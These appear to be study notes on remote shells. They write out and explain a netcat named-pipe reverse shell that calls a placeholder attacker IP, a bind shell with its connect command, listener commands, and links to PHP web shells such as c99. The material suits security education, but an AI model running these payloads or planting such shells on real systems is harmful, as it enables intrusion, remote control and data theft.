What is a Shell ?
- software that allows a user to intereact with an OS
- graphical interface or usually command-line interface

- **Remote System Control**: allows the attacker to execute commands or software remotely in the target system.
- **Privilege Escalation**: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
- **Data Exfiltration**: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
- **Persistence and Maintenance Access**: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
- **Post-Exploitation Activities**: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
- **Access Other Systems on the Network**: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.

 nc -lvnp 4444
---
## Reverse Shell

- connect back to the attacker's machine
- use Netcat for wait the connection by using known ports  like 53,80,8080, 443 , 139 or 445
- allows an attacker to execute commands remotely after the target connects back

##### Reverse Shell Access

**pipe reverse shell**:
``rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f``

**Explanation of the Payload**

- `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO (first-in, first-out), at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f` - This part pipes the shell's output through `nc` (Netcat) to the attacker's IP address (`ATTACKER_IP`) on the attacker's port (`ATTACKER_PORT`).
- `>/tmp/f` -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.

---
### Bind Shell

- bind a port on the compromised system and listen for a connection
- connection occurs = > exposes the shell session => attacker can execute commands remotely

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`

**Explanation of the Payload**

- `rm -f /tmp/f` - This command removes any existing named pipe file located at `/tmp/f/`. This ensures that the script can create a new named pipe without conflicts.
- `mkfifo /tmp/f` - This command creates a named pipe, or FIFO, at `/tmp/f`. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
- `cat /tmp/f` - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
- `| bash -i 2>&1` - The output of `cat` is piped to a shell instance (`bash -i`), which allows the attacker to execute commands interactively. The `2>&1` redirects standard error to standard output, ensuring error messages are returned to the attacker.
- **`| nc -l 0.0.0.0 8080`** - Starts Netcat in listen mode (`-l`) on all interfaces (`0.0.0.0`) and port `8080`. The shell will be exposed to the attacker once they connect to this port.
- `>/tmp/f` This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.

After that , the target machine is waiting for incoming connections, we use Netcat again:

`nc -nv TARGET_IP 8080`
**Explanation of the command**

- `nc` - This invokes Netcat, which establishes the connection to the target.
- `-n` - Disables DNS resolution, allowing Netcat to operate faster and avoid unnecessary lookups.
- `-v` - Verbose mode provides detailed output of the connection process, such as when the connection is established.
- `TARGET_IP` - The IP address of the target machine where the bind shell is running.
- `8080` - The port number on which the bind shell listens.
----
### Shell Listeners

We saw Netcat to handle connection and allow the attacket to interact with the exposed shell , but Netcat is not the only one.

- Rlwrap : small utility that uses the GNU readline librabry to provide editing keyboard and history
```shell-session
rlwrap nc -lvnp 443
```

- Ncat : improved version of Netcat distributed by the NMAP project. Provides extra features , like encryption ( SSL )
```shell-session
ncat -lvnp 4444
```

- Socat :allow to create a socket connection between two data sources , in this case , two different hosts
```shell-session
socat -d -d TCP-LISTEN:443 STDOUT
```
---
### Shell Payloads

- command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell

---
### Web Shell
- script written in a language supported by a compromised web server that executes commands through the web server itself
- file containing code that executes commands and handles files.

- [p0wny-shell](https://github.com/flozz/p0wny-shell): A minimalistic single-file PHP web shell that allows remote command execution.
- [b374k shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities.
- [c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.
- can find more web shells at: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php).